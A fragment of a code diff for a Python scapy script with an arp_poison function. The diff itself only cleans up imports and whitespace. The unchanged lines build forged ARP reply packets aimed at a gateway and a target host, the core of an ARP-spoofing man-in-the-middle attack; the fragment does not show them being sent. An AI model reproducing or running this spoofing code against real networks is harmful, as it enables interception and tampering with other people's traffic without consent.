@@ -1,4 +1,4 @@
-from scapy.all import sr, sendp, send # Added sendp and Ether
+from scapy.all import sr, sendp
 from scapy.layers.l2 import ARP, Ether
 from time import sleep
 import sys
@@ -18,7 +18,7 @@ def get_mac(ip_address):
 
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
     print("Poisoning ARP... (CTRL+C to exit)")
-
+ 
     packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
     
     packet_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
